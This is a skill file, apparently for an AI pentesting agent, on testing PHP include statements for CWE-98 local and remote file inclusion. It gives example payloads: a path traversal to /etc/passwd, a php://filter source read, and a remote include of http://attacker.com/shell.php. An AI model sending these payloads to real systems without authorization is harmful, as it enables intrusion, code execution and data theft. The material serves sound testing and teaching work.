
name: cwe-98-php-rfi
description: Use when a web injection sink accepts CWE input.
version: 1.0.0
license: MIT
platforms: [linux, windows]
tags: [cwe, cwe-98, injection, a05, pentest, owasp]
category: pentesting-skills
related_skills:
  - owasp-a05-injection
---

# CWE-98 - PHP Remote File Inclusion

CWE-98: a PHP `include`, `require`, `include_once`, or `require_once` uses a user-controlled path, enabling the attacker to include a remote or local file.

## Parent Skill

This is a sub-skill of `owasp-a05-injection` (OWASP A05 Injection, Top 10 2025).
Load the parent for overall A05 scope, the test procedure, and validation criteria
(negative control). This skill covers the CWE-98 detail: what to look for,
how to trigger it, and what a confirmed finding looks like.

## When to Use

- When a PHP parameter is used in an `include`, `require`, or similar statement.

## Detection & Test

1. **Find the include sink.** Search for `include`, `require`, `include_once`, `require_once` with a variable argument.
2. **Test LFI first.** Send `file=../../../etc/passwd` to test local file inclusion.
3. **Test RFI.** If `allow_url_include=On`, send `file=http://attacker.com/shell.php` to test remote file inclusion.
4. **Confirm execution.** Verify the included file's code runs in the app context.
5. **Document the sink, payload, and proof.

## Example Findings

- `include($_GET['page'])` where page = `php://filter/convert.base64-encode/resource=index`.
- `require($file)` where file = `http://attacker.com/shell.php` (RFI).

## Impact

- Data disclosure, logic manipulation, or code execution through the injection point.
- Privilege escalation or session hijack if the injection reaches auth/session logic.
- Persistence until the sink is parameterized or the input is validated.
- Lateral movement when the same unsanitized sink repeats across endpoints.

## See Also

- `owasp-a05-injection` - parent skill (A05 scope, Test Procedure, Validation, reporting).
- `owasp-top10-2025-testing` - top-level OWASP Top 10 2025 reference (full 249-CWE table, priority order).